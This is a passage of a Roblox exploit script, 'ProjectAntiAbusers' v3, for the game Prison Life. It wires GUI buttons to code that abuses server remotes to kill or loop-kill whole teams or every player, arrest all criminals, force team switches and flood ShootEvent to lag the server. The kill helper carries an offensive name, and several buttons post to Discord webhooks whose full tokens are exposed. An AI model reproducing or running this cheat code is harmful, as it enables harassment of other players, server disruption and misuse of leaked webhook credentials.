ProjectAntiAbusers.Keybinds.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.Keybinds.Position = UDim2.new(0, 0, 0.843333364, 0)
ProjectAntiAbusers.Keybinds.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.Keybinds.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Keybinds.Text = "KeyBinds"
ProjectAntiAbusers.Keybinds.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Keybinds.TextSize = 14.000

ProjectAntiAbusers.UICorner_97.Parent = ProjectAntiAbusers.Keybinds

ProjectAntiAbusers.Credits.Name = "Credits"
ProjectAntiAbusers.Credits.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.Credits.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.Credits.Position = UDim2.new(0, 0, 0.90871799, 0)
ProjectAntiAbusers.Credits.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.Credits.Font = Enum.Font.SourceSans
ProjectAntiAbusers.Credits.Text = "Credits"
ProjectAntiAbusers.Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.Credits.TextSize = 14.000

ProjectAntiAbusers.UICorner_98.Parent = ProjectAntiAbusers.Credits

ProjectAntiAbusers.AdminStuff.Name = "AdminStuff"
ProjectAntiAbusers.AdminStuff.Parent = ProjectAntiAbusers.ScrollingTabs
ProjectAntiAbusers.AdminStuff.BackgroundColor3 = Color3.fromRGB(11, 94, 154)
ProjectAntiAbusers.AdminStuff.Position = UDim2.new(0, 0, 0.649102569, 0)
ProjectAntiAbusers.AdminStuff.Size = UDim2.new(0, 89, 0, 26)
ProjectAntiAbusers.AdminStuff.Font = Enum.Font.SourceSans
ProjectAntiAbusers.AdminStuff.Text = "Admin Stuff"
ProjectAntiAbusers.AdminStuff.TextColor3 = Color3.fromRGB(255, 255, 255)
ProjectAntiAbusers.AdminStuff.TextSize = 14.000

ProjectAntiAbusers.UICorner_99.Parent = ProjectAntiAbusers.AdminStuff

-- Scripts:

local function UQZO_fake_script() -- ProjectAntiAbusers.KillTeamGuard.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillTeamGuard)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(UQZO_fake_script)()
local function EMPAMTI_fake_script() -- ProjectAntiAbusers.KillTeamInmate.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillTeamInmate)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(EMPAMTI_fake_script)()
local function AWSBWCF_fake_script() -- ProjectAntiAbusers.KillTeamCrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillTeamCrim)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(AWSBWCF_fake_script)()
local function TYHXGP_fake_script() -- ProjectAntiAbusers.KillTeamNeutral.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillTeamNeutral)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(TYHXGP_fake_script)()
local function HFHDP_fake_script() -- ProjectAntiAbusers.LoopKillGuard.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillGuard)

	loopcop = false
	script.Parent.MouseButton1Click:connect(function()
		if loopcop == false then
			loopcop = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			loopcop = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while loopcop == true do
			wait(.1)
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					i = 1
					repeat
						i = i-1
						rape(v)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(HFHDP_fake_script)()
local function EUKVR_fake_script() -- ProjectAntiAbusers.LoopKillInmate.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillInmate)

	looppris = false
	script.Parent.MouseButton1Click:connect(function()
		if looppris == false then
			looppris = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			looppris = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while looppris == true do
			wait(.1)
			for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					i = 1
					repeat
						i = i-1
						rape(v)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(EUKVR_fake_script)()
local function NPWOQFX_fake_script() -- ProjectAntiAbusers.LoopKillNeutral.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillNeutral)

	loopskid = false
	script.Parent.MouseButton1Click:connect(function()
		if loopskid == false then
			loopskid = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			loopskid = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while loopskid == true do
			wait(.1)
			for i,v in pairs(game.Teams.Neutral:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name then
					i = 1
					repeat
						i = i-1
						rape(v)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(NPWOQFX_fake_script)()
local function QPBCJRI_fake_script() -- ProjectAntiAbusers.LoopKillCrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillCrim)

	loopcrim = false
	script.Parent.MouseButton1Click:connect(function()
		if loopcrim == false then
			loopcrim = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			loopcrim = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while loopcrim == true do
			wait(.1)
			for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
					i = 1
					repeat
						i = i-1
						rape(v)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(QPBCJRI_fake_script)()
local function YCLPFP_fake_script() -- ProjectAntiAbusers.KillAll.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAll)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(YCLPFP_fake_script)()
local function AGHZX_fake_script() -- ProjectAntiAbusers.ArrestAll.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ArrestAll)

	script.Parent.MouseButton1Click:connect(function()
		saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
			if v.Name ~= game.Players.LocalPlayer.Name and not v:IsFriendsWith(game.Players.LocalPlayer.UserId) then
				i = 3
				repeat
					i = i-1
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
					wait()
					workspace.Remote.arrest:InvokeServer(v.Character.HumanoidRootPart)
					for z = 1,13 do
						workspace.Remote.meleeEvent:FireServer(v)
					end
				until i == 0
			end
		end
	end)
end
coroutine.wrap(AGHZX_fake_script)()
local function HWSEL_fake_script() -- ProjectAntiAbusers.KillShieldUser.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillShieldUser)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Backpack["Riot Shield"] ~= nil then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(HWSEL_fake_script)()
local function RDZWY_fake_script() -- ProjectAntiAbusers.KillAmmorUser.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.KillAmmorUser)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Teams.Guards:GetPlayers()) do
			if v.Character["Vest"] ~= nil then
				i = 1
				repeat
					i = i-1
					rape(v)
				until i == 0
			end
		end
	end)
end
coroutine.wrap(RDZWY_fake_script)()
local function TVWOMBW_fake_script() -- ProjectAntiAbusers.LoopKillShieldUser.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillShieldUser)

	loopshield = false
	script.Parent.MouseButton1Click:connect(function()
		if loopshield == false then
			loopshield = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			loopshield = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while loopshield == true do
			wait(1)
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v.Name ~= game.Players.LocalPlayer.Name and v.Backpack["Riot Shield"] ~= nil then
					i = 1
					repeat
						i = i-1
						rape(v)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(TVWOMBW_fake_script)()
local function CHQLNI_fake_script() -- ProjectAntiAbusers.LoopKillAmmorUser.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopKillAmmorUser)

	looparmor = false
	script.Parent.MouseButton1Click:connect(function()
		if looparmor == false then
			looparmor = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			looparmor = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while looparmor == true do
			wait(.1)
			for i,v in pairs(game.Teams.Guards:GetPlayers()) do
				if v.Character:FindFirstChild("Vest") ~= nil then
					i = 1
					repeat
						i = i-1
						rape(v)
					until i == 0
				end
			end
		end
	end)
end
coroutine.wrap(CHQLNI_fake_script)()
local function DMWOU_fake_script() -- ProjectAntiAbusers.MakeAllCrimKill.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.MakeAllCrimKill)

	script.Parent.MouseButton1Click:connect(function()
	for i,v in pairs(game.Players:GetPlayers()) do
		if v.Team ~= "Criminals" then
			for _, melee in pairs(workspace.Prison_ITEMS.single:GetChildren()) do
				if melee.Name ~= "Hammer" then
					workspace.Remote.ItemHandler:InvokeServer(melee.ITEMPICKUP)
				end
			end
			wait(.1)
			i = 1
			repeat
				i = i-1
				for i = 1,5 do
					game.ReplicatedStorage.meleeEvent:FireServer(v, game.Players.LocalPlayer.Backpack("Crude Knife"))
					local Crim = Instance.new("Part")
   Crim.Name = "plr"
     Crim.Parent = workspace
       Crim.Anchored = true
         Crim.Archivable = true
           Crim.CFrame = CFrame.new(9e99, 9e99, 9e99)
              Bruh = game.Workspace["Criminals Spawn"].SpawnLocation
	          Crim.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
	       Crim.Transparency = 1
	    Crim.Anchored = true
	 Crim.CanCollide = false
  lol = true				
Bruh = game.Workspace["Criminals Spawn"].SpawnLocation
  Bruh.CanCollide = false
    Bruh.Size = Vector3.new(51.05, 24.12, 54.76)
	  Bruh.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		 Bruh.Transparency = 1
		 		   wait(0.001)
		     lol = false
		         if lol == false then
		           Bruh.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
		           Bruh.Size = Vector3.new(6, 0.2, 6)
		           Bruh.Transparency = 0
				   lol = false
				 end
				end
			until i == 0
		end
	end
end)

	
end
coroutine.wrap(DMWOU_fake_script)()
local function QKOCAH_fake_script() -- ProjectAntiAbusers.ppgun.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ppgun)

	script.Parent.MouseButton1Click:connect(function()
		for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			if (v:IsA("Tool")) then
				v.GripPos = Vector3.new(1,2,0)
			end
		end
		Type("ppified all guns")
	end)
end
coroutine.wrap(QKOCAH_fake_script)()
local function UACGT_fake_script() -- ProjectAntiAbusers.listcrims.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.listcrims)

	script.Parent.MouseButton1Click:connect(function()
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "There are "..crimamount.." Criminals",
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "Criminals are: "..table.concat(crims, ", "),
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		Type("Listed all criminals")
	end)
end
coroutine.wrap(UACGT_fake_script)()
local function PMHA_fake_script() -- ProjectAntiAbusers.listinmate.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.listinmate)

	script.Parent.MouseButton1Click:connect(function()
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "There are "..prisamount.." Prisoners",
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "Prisoners are: "..table.concat(pris, ", "),
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		Type("listed all prisoners")
	end)
end
coroutine.wrap(PMHA_fake_script)()
local function RUCHOMP_fake_script() -- ProjectAntiAbusers.listguards.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.listguards)

	script.Parent.MouseButton1Click:connect(function()
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "There are "..CopAmount.." Guards",
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "Guards are: "..table.concat(cops, ", "),
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		Type("Listed all cops")
	end)
end
coroutine.wrap(RUCHOMP_fake_script)()
local function VKYPS_fake_script() -- ProjectAntiAbusers.listneutral.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.listneutral)

	script.Parent.MouseButton1Click:connect(function()
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "There are "..skidamount.." Neutrals",
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = "Neutrals are: "..table.concat(skids, ", "),
			Color = Color3.new(0,0,0),
			FontSize = Enum.FontSize.Size24
		})
		Type("Listed all skids")
	end)
end
coroutine.wrap(VKYPS_fake_script)()
local function YRPHNF_fake_script() -- ProjectAntiAbusers.clicktp.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.clicktp)

	script.Parent.MouseButton1Click:connect(function()
		player1=game.Players.LocalPlayer
		
		q=Instance.new('HopperBin', player1.Backpack)
		q.Name = 'Click Teleport'
		
		
		bin = q
		
		
		
		function teleportPlayer(pos)
			local player = game.Players.LocalPlayer
			if player == nil or player.Character == nil then return end
			player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(pos.x, pos.y + 7, pos.z))
		end
		
		
		enabled = true
		function onButton1Down(mouse)
			if not enabled then
				return
			end
			
			local player = game.Players.LocalPlayer
			if player == nil then return end
			
			
			enabled = false
			local cf = mouse.Hit
			local v = cf.lookVector
			
			teleportPlayer(cf.p)
			
			wait()
			enabled = true
			
		end
		
		function onSelected(mouse)
			mouse.Icon = "rbxasset://textures\\ArrowCursor.png"
			mouse.Button1Down:connect(function() onButton1Down(mouse) end)
		end
		
		bin.Selected:connect(onSelected)
	end)
end
coroutine.wrap(YRPHNF_fake_script)()
local function GPZXA_fake_script() -- ProjectAntiAbusers.lagserver.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.lagserver)

	script.Parent.MouseButton1Click:connect(function()
		Z = Vector3.new()
		workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
		local main={Hit=nil;Distance=0;Cframe=CFrame.new(Z,Z)*CFrame.new(0,0,0);RayObject=Ray.new(Z,Z);}
		local remote = game.ReplicatedStorage.ShootEvent
		local gun = game.Players.LocalPlayer.Backpack:FindFirstChild("M9")
		for i = 1,100 do
			for i = 1,100 do
			remote:FireServer(main, gun)
			end
		end
	end)
end
coroutine.wrap(GPZXA_fake_script)()
local function FSTCAP_fake_script() -- ProjectAntiAbusers.spamm9.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.spamm9)

	m9 = false
	script.Parent.MouseButton1Click:connect(function()
		if m9 == false then
			m9 = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			m9 = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while m9 == true do
			wait(.1)
			saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			wait(.1)
			workspace.Remote.loadchar:InvokeServer("", "Bright blue")
			wait(.1)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
			game.Players.LocalPlayer.Character:BreakJoints()
			wait(.1)
		end
	end)
end
coroutine.wrap(FSTCAP_fake_script)()
local function DVFDMJY_fake_script() -- ProjectAntiAbusers.OpenGate.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.OpenGate)

	script.Parent.MouseButton1Click:connect(function()
		Workspace.Remote.ItemHandler:InvokeServer(workspace["Prison_ITEMS"].buttons["Prison Gate"]["Prison Gate"])
	end)
end
coroutine.wrap(DVFDMJY_fake_script)()
local function GKHRFKM_fake_script() -- ProjectAntiAbusers.LoopToggle.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.LoopToggle)

	script.Parent.MouseButton1Click:connect(function()
		if workspace["Music_Player"].Looped == false then
			workspace["Music_Player"].Looped = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			workspace["Music_Player"].Looped = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
	end)
end
coroutine.wrap(GKHRFKM_fake_script)()
local function WPXYCSR_fake_script() -- ProjectAntiAbusers.StopButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.StopButton)

	script.Parent.MouseButton1Click:connect(function()
		for i=1,25 do
			workspace["Music_Player"]:Remove()
			wait()
		end
	end)
end
coroutine.wrap(WPXYCSR_fake_script)()
local function YWCIOON_fake_script() -- ProjectAntiAbusers.PlayButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.PlayButton)

	script.Parent.MouseButton1Click:connect(function()
		local ClientSound = Instance.new("Sound")
		ClientSound.SoundId = "http://www.roblox.com/asset/?id="..script.Parent.Parent.Text
		ClientSound.Volume = .5
		ClientSound.Parent = workspace
		ClientSound.PlaybackSpeed = 1
		ClientSound:Play()
		wait()
		ClientSound.Name = "Music_Player"
	end)
end
coroutine.wrap(YWCIOON_fake_script)()
local function VGXFCG_fake_script() -- ProjectAntiAbusers.ReportButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ReportButton)

	script.Parent.MouseButton1Click:connect(function()
		args = {
			"https://discordapp.com/api/webhooks/764560415186616350/k5e--6JtBX24NP3XjLTy9NI7lOI_kAvfm889-P0pOXR10MCwAH1yN4DFJ_W_SqeaWV6-",
			game.Players.LocalPlayer.Name.." Found a bug for paa v3! bug: "..script.Parent.Parent.Text
		}
		sendweb(unpack(args))
	end)
end
coroutine.wrap(VGXFCG_fake_script)()
local function JBKQD_fake_script() -- ProjectAntiAbusers.FeedbackButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.FeedbackButton)

	script.Parent.MouseButton1Click:connect(function()
		args = {
			"https://discordapp.com/api/webhooks/747076618215882763/MIy75vpShKH39YhI3ydy1xuVyEasLhDvFlPe1Nasu8nslP1UQ58GJIloEmYOkfgNDwjb",
			game.Players.LocalPlayer.Name.." gave feedback: their feedback: "..script.Parent.Parent.Text
		}
		sendweb(unpack(args))
	end)
end
coroutine.wrap(JBKQD_fake_script)()
local function YPQUBGG_fake_script() -- ProjectAntiAbusers.SuggestButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.SuggestButton)

	script.Parent.MouseButton1Click:connect(function()
		args = {
			"https://discordapp.com/api/webhooks/747076329962471466/DakpKK4JmA93BoqwF-LFBe-uMFIdoV09dvoZo_UKQC5GytArxC6uD0LzuLnh6mkzuUCc",
			game.Players.LocalPlayer.Name.." suggested something! their suggestion: "..script.Parent.Parent.Text
		}
		sendweb(unpack(args))
	end)
end
coroutine.wrap(YPQUBGG_fake_script)()
local function BLWZM_fake_script() -- ProjectAntiAbusers.ReportExploiterButton.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.ReportExploiterButton)

	script.Parent.MouseButton1Click:connect(function()
		args = {
			"https://discordapp.com/api/webhooks/754644225261436979/LKFmxfJkTOdyuGYQtuMZRjgcVLYyKpMyF385mBAYvcEdjxnouoDa4EXTkwiO5E1mHW-I",
			game.Players.LocalPlayer.Name.." reported the exploiter "..script.Parent.Parent.Text
		}
		sendweb(unpack(args))
	end)
end
coroutine.wrap(BLWZM_fake_script)()
local function BXNXA_fake_script() -- ProjectAntiAbusers.JoinGuards.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinGuards)

	script.Parent.MouseButton1Click:connect(function()
		team = game.Teams.Guards:GetPlayers()
		if #team >= 8 then
			saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
			saved2 = workspace.Camera.CFrame
			workspace.Remote.loadchar:InvokeServer("", "Bright blue")
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
			wait(0.05)
			workspace.Camera.CFrame = saved2
		else
			workspace.Remote.TeamEvent:FireServer("Bright blue")
		end
	end)
end
coroutine.wrap(BXNXA_fake_script)()
local function AXZVMZC_fake_script() -- ProjectAntiAbusers.JoinNeutral.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinNeutral)

	script.Parent.MouseButton1Click:connect(function()
		workspace.Remote.TeamEvent:FireServer("Medium stone grey")
	end)
end
coroutine.wrap(AXZVMZC_fake_script)()
local function DVDVHPE_fake_script() -- ProjectAntiAbusers.JoinFogTeam.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinFogTeam)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer('', "Fog")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
		wait(.06)
		workspace.Camera.CFrame = saved2
	end)
end
coroutine.wrap(DVDVHPE_fake_script)()
local function FJJJQKU_fake_script() -- ProjectAntiAbusers.JoinRedTeam.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinRedTeam)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer("", "Maroon")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
		wait(.06)
		workspace.Camera.CFrame = saved2
	end)
end
coroutine.wrap(FJJJQKU_fake_script)()
local function TEJOHLH_fake_script() -- ProjectAntiAbusers.JoinCustomTeamRGB.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinCustomTeamRGB)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer('', Color3.new(script.Parent.Parent["RGB(Red)TextBox"].Text, script.Parent.Parent["RGB(Green)TextBox"].Text, script.Parent.Parent["RGB(Blue)TextBox"].Text))
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
		wait(.06)
		workspace.Camera.CFrame = saved2
	end)
end
coroutine.wrap(TEJOHLH_fake_script)()
local function VHIGR_fake_script() -- ProjectAntiAbusers.JoinInmate.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinInmate)

	script.Parent.MouseButton1Click:connect(function()
		workspace.Remote.TeamEvent:FireServer("Bright orange")
	end)
end
coroutine.wrap(VHIGR_fake_script)()
local function JBUWK_fake_script() -- ProjectAntiAbusers.JoinCrim.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinCrim)

	script.Parent.MouseButton1Click:connect(function()
		Apart = Instance.new("Part")
		
		Apart.Name = "PlrsPos"
		Apart.Parent = workspace
		Apart.Anchored = true
		Apart.Archivable = true
		Apart.CFrame = CFrame.new(9e99, 9e99, 9e99)
		
		LCS = game.Workspace["Criminals Spawn"].SpawnLocation
		
		_G.killAura = true
		wait(0.2)
		
		Apart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		Apart.Transparency = 1
		Apart.Anchored = true
		Apart.CanCollide = false
		
		istptoplr = true
		wait(0.004)
		
		
		LCS = game.Workspace["Criminals Spawn"].SpawnLocation
		
		LCS.CanCollide = false
		LCS.Size = Vector3.new(51.05, 24.12, 54.76)
		LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		LCS.Transparency = 1
		
		wait(2)
		
		istptoplr = false
		_G.killAura = false
		
		wait(0.04)
		
		if istptoplr == false then
			LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			LCS.Size = Vector3.new(6, 0.2, 6)
			LCS.Transparency = 0
			istptoplr = false
		end
	end)
end
coroutine.wrap(JBUWK_fake_script)()
local function JUJHVE_fake_script() -- ProjectAntiAbusers.JoinBlackTeam.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinBlackTeam)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer('', "Really black")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
		wait(.06)
		workspace.Camera.CFrame = saved2
	end)
end
coroutine.wrap(JUJHVE_fake_script)()
local function VVPYYUX_fake_script() -- ProjectAntiAbusers.JoinGreenTeam.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinGreenTeam)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer("", "Bright green")
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
		wait(.06)
		workspace.Camera.CFrame = saved2
	end)
end
coroutine.wrap(VVPYYUX_fake_script)()
local function QJNMP_fake_script() -- ProjectAntiAbusers.JoinCustomTeamBrickColour.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.JoinCustomTeamBrickColour)

	script.Parent.MouseButton1Click:connect(function()
		saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		saved2 = workspace.Camera.CFrame
		workspace.Remote.loadchar:InvokeServer('', script.Parent.Parent.BrickColourTextBox.Text)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
		wait(.06)
		workspace.Camera.CFrame = saved2
	end)
end
coroutine.wrap(QJNMP_fake_script)()
local function NXIKO_fake_script() -- ProjectAntiAbusers.AutoRespawn.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.AutoRespawn)

	ar = false
	script.Parent.MouseButton1Click:connect(function()
		if ar == false then
			ar = true
			script.Parent.TextColor3 = Color3.new(0,255,0)
		else
			ar = false
			script.Parent.TextColor3 = Color3.new(255,0,0)
		end
		while ar do wait()
            if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then
                if game.Players.LocalPlayer.PlayerGui.Home.hud.Topbar.titleBar.Title.Text == "Lights out" and game.Players.LocalPlayer.TeamColor.Color == "Bright orange" then
                    saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    saved2 = workspace.Camera.CFrame
                    workspace.Remote.loadchar:InvokeServer("", "Fog")
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
                    wait(.06)
                    workspace.Remote.TeamEvent:FireServer("Bright orange")
                    workspace.Camera.CFrame = saved2
                else
				saved1 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
				saved2 = workspace.Camera.CFrame
				workspace.Remote.loadchar:InvokeServer()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved1
				wait(.06)
                workspace.Camera.CFrame = saved2
                end
			end
		end
	end)
end
coroutine.wrap(NXIKO_fake_script)()
local function JUSQF_fake_script() -- ProjectAntiAbusers.OnePunch.LocalScript 
	local script = Instance.new('LocalScript', ProjectAntiAbusers.OnePunch)

	onep = false
